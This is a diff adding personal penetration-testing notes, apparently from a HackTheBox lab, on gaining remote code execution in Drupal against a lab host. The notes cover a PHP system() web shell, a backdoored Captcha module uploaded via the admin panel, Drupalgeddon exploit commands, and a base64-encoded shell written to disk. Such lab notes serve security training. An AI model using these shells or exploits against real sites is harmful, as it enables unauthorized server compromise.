@@ -220,4 +220,45 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ```bash
 curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
 ```
-
+* Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module
+	* Download the archive and extract its contents
+	* create the php web shell
+	* create a .htaccess file to give ourselves access to the folder
+```html
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+* The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive
+```bash
+$ mv shell.php .htaccess captcha
+$ tar cvf captcha.tar.gz captcha/
+```
+* Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar
+* click on the `+ Install new module` button
+* Browse to the backdoored Captcha archive and click `Install`
+* Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands
+* HTB covers 3 rce vulns (`drupalgeddon`):
+1. [CVE-2014-3704](https://www.exploit-db.com/exploits/34992)
+```bash
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
+2. [CVE-2018-7600](https://www.exploit-db.com/exploits/44448)
+```bash
+python3 drupalgeddon2.p
+```
+* modify the script to gain remote code execution by uploading a malicious PHP file
+```php
+<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
+```
+```bash
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+```
+```bash
+ echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+```
+* run the modified exploit script to upload our malicious PHP file
+* confirm rce with curl
+3. [CVE-2018-7602](https://github.com/rithchard/Drupalgeddon3)
+* can exploit this using Metasploit, but we must first log in and obtain a valid session cookie
